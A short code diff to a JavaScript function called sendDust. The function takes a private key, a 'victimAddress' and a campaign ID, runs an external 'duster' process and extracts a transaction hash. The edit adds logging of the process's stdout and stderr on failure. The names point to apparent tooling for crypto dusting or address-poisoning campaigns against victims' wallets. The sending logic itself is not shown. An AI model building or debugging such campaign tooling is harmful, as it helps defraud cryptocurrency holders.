@@ -318,11 +318,14 @@ async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
     // 🚀 NEW: Extract TX hash from stdout (matches 0x followed by 64 hex chars)
     const txHashMatch = stdout.match(/0x[a-fA-F0-9]{64}/);
     return txHashMatch ? txHashMatch[0] : true; // Return hash if found, otherwise true for success
-  } catch (error) {
+   } catch (error) {
     if (error.killed && error.signal === 'SIGTERM') {
       logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
     } else {
       logger.error(`duster error: ${error.message}`);
+      // 🚨 CRITICAL: Log the actual Python output to see exactly WHY it failed
+      if (error.stdout) logger.info(`duster stdout (failed): ${error.stdout.trim()}`);
+      if (error.stderr) logger.warn(`duster stderr (failed): ${error.stderr.trim()}`);
     }
     return false;
   }
